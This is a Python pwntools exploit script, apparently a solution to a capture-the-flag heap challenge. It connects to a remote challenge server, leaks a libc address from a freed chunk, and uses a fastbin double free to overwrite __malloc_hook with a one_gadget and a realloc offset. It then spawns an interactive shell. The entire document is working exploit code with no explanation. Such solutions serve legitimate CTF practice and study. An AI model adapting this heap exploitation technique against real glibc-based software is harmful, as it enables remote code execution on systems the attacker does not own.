from pwn import *
import time

context.log_level = 'debug'

debug = False

elf = ELF("./vuln")
#libc = ELF("/home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6")
libc = ELF("./libc.so.6")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 31587)


def ddebug():
    gdb.attach(io)
    pause()


rop = ROP('./vuln')
roplibc = ROP("./libc.so.6")


def add(idx, size, content):
    io.sendlineafter(">", "1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))
    io.sendlineafter("Content: ", content)


def delete(idx):
    io.sendlineafter(">", "2")
    io.sendlineafter("Index: ", str(idx))


def show(idx):
    io.sendlineafter(">", "3")
    io.sendlineafter("Index: ", str(idx))


add(0, 0xd0, "abc")
add(1, 0x60, "abc")
add(2, 0x60, "abc")
add(3, 0x60, "abc")

delete(0)
show(0)

libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
success("main_arena -> " + hex(libcmain_offset))

main_arena_offset = 0x7f9834610b78-0x7f983424c000
#main_arena_offset = 0x3c4b78 
libc.address = libcmain_offset - main_arena_offset
success("libc address -> " + hex(libc.address))
_malloc_hook_address = libc.symbols["__malloc_hook"]
success("malloc_hook -> " + hex(_malloc_hook_address))
realloc_address = libc.sym['realloc']
success("_realloc_address -> " + hex(realloc_address))
success("system -> " + hex(libc.symbols["system"]))
one = libc.address + 0xf1247
delete(1)
delete(2)
delete(1)


add(4, 0x60, p64(_malloc_hook_address - 0x23))
add(5, 0x60, p64(0))
add(6, 0x60, p64(0))
add(7, 0x60, b"\x00" * (0x13-8) + p64(one) + p64(realloc_address+11))
io.sendlineafter(b">", b"1")
#ddebug()
io.sendlineafter(b"Index: ", b'8')
io.sendlineafter(b"Size: ", str(0x60).encode())

io.interactive()
